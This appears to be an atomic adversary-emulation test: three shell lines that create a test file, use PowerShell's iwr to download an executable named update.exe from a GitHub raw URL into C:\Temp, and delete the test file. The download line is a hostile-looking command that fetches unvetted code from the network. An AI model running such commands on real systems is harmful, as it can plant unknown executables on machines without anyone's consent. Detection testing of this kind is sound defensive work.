echo "Atomic Test File" > test.txt

powershell.exe iwr https://github.com/markersmake/RandomScripts/raw/master/update.exe -OutFile C:\Temp\update.exe

del test.txt
